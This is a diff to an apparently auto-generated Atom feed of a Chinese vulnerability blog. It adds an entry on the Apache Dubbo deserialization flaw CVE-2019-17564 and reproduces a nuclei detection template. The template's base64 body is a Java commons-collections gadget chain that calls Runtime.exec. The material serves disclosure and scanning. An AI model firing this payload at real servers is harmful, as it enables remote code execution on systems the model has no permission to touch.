@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-25T08:00:16.297Z</updated>
+  <updated>2025-06-25T08:30:18.864Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Apache Dubbo 反序列化漏洞</title>
+    <link href="http://example.com/2025/06/25/github_632028832/"/>
+    <id>http://example.com/2025/06/25/github_632028832/</id>
+    <published>2025-06-25T08:30:18.867Z</published>
+    <updated>2025-06-25T08:30:18.864Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache Dubbo 反序列化漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-17564</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Apache Dubbo在启用HTTP远程调用时存在不安全的反序列化漏洞。攻击者可以提交一个包含Java对象的POST请求，完全控制Apache Dubbo的Provider实例，如果该实例启用了HTTP。此漏洞影响Apache Dubbo 2.7.0至2.7.4、2.6.0至2.6.7以及所有2.5.x版本。</p><p><strong>产品厂商：</strong> apache</p><p><strong>产品名称：</strong> dubbo</p><p><strong>影响版本：</strong> 2.5.x-2.7.4</p><p><strong>搜索语法：</strong> app&#x3D;”apache-dubbo”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/1ac7f0b857d76e238717e3eb97b40dbef78c740b/http%2Fcves%2F2019%2FCVE-2019-17564.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/1ac7f0b857d76e238717e3eb97b40dbef78c740b/http%2Fcves%2F2019%2FCVE-2019-17564.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">17564</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Apache Dubbo <span class="hljs-number">2.5</span>.x-<span class="hljs-number">2.7</span>.<span class="hljs-number">4</span> <span class="hljs-operator">-</span> Insecure Deserialization<br>  <span class="hljs-params">author:</span> Khalid6468<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Unsafe deserialization occurs within a Dubbo application which has HTTP remoting enabled. An attacker may submit a POST request <span class="hljs-keyword">with</span> a Java object <span class="hljs-keyword">in</span> it to completely compromise a Provider instance of Apache Dubbo, <span class="hljs-keyword">if</span> this instance enables HTTP. This issue affected Apache Dubbo <span class="hljs-number">2.7</span>.<span class="hljs-number">0</span> to <span class="hljs-number">2.7</span>.<span class="hljs-number">4</span>, <span class="hljs-number">2.6</span>.<span class="hljs-number">0</span> to <span class="hljs-number">2.6</span>.<span class="hljs-number">7</span>, and all <span class="hljs-number">2.5</span>.x versions.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//advisory.checkmarx.net/advisory/CX-2020-4275</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/Hu3sky/CVE-2019-17564</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/r00t4dm/CVE-2019-17564</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>dubbo.apache.org<span class="hljs-operator">/</span>en<span class="hljs-operator">/</span>docs3-v2<span class="hljs-operator">/</span>java-sdk<span class="hljs-operator">/</span>advanced-features-and-usage<span class="hljs-operator">/</span>security<span class="hljs-symbol">/</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">17564</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">502</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.88597</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99463</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:apache:dubbo:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> apache<br>    <span class="hljs-params">product:</span> dubbo<br>    <span class="hljs-params">fofa-query:</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;apache-dubbo&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2019,dubbo,apache,deserialization,rce,kev<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">interface:</span> <span class="hljs-string">&quot;com.example.TestService&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/&#123;&#123;interface&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>    <span class="hljs-params">body:</span> |<br>          &#123;&#123;base64_decode(&#x27;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI<span class="hljs-operator">/</span>QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB<span class="hljs-operator">+</span>AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo<span class="hljs-operator">/</span><span class="hljs-number">2</span>t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB<span class="hljs-operator">+</span>ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB<span class="hljs-operator">+</span>ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5<span class="hljs-operator">+</span>kde0cCAAB4cAAAAAF0AAJsc3QABGV4ZWN1cQB<span class="hljs-operator">+</span>ABsAAAABcQB<span class="hljs-operator">+</span>ACBzcQB<span class="hljs-operator">+</span>AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4&#x27;)&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;java.lang.ClassNotFoundException&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;java.io.InvalidClassException&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;java.lang.ClassCastException&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;java.io.StreamCorruptedException&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;java.rmi.RemoteException: Deserialized object needs to be assignable&quot;</span><br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">500</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">400</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;java<span class="hljs-char escape_">\\</span>.lang<span class="hljs-char escape_">\\</span>..*Exception&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;java<span class="hljs-char escape_">\\</span>.io<span class="hljs-char escape_">\\</span>..*Exception&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache Dubbo 反序列化漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
   
   <entry>
     <title>TOTOLINK N150RT 密码暴露漏洞</title>
@@ -515,33 +542,6 @@
       
     <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 国家互联网应急中心CNCERT&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/PKyu1nrhHxPKAV5gBMvtsA&quot;&gt;https://mp.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="国家互联网应急中心CNCERT" scheme="http://example.com/tags/%E5%9B%BD%E5%AE%B6%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E6%80%A5%E4%B8%AD%E5%BF%83CNCERT/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络安全信息与动态周报2025年第25期（6月16日-6月22日）</title>
-    <link href="http://example.com/2025/06/25/weixin_3551478892/"/>
-    <id>http://example.com/2025/06/25/weixin_3551478892/</id>
-    <published>2025-06-25T05:19:32.744Z</published>
-    <updated>2025-06-25T05:19:32.741Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 国家互联网应急中心CNCERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Ca7KqQcRLqxP0NYwKKdxXA">https://mp.weixin.qq.com/s/Ca7KqQcRLqxP0NYwKKdxXA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 国家互联网应急中心CNCERT&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Ca7KqQcRLqxP0NYwKKdxXA&quot;&gt;https://mp.</summary>
       
     
     
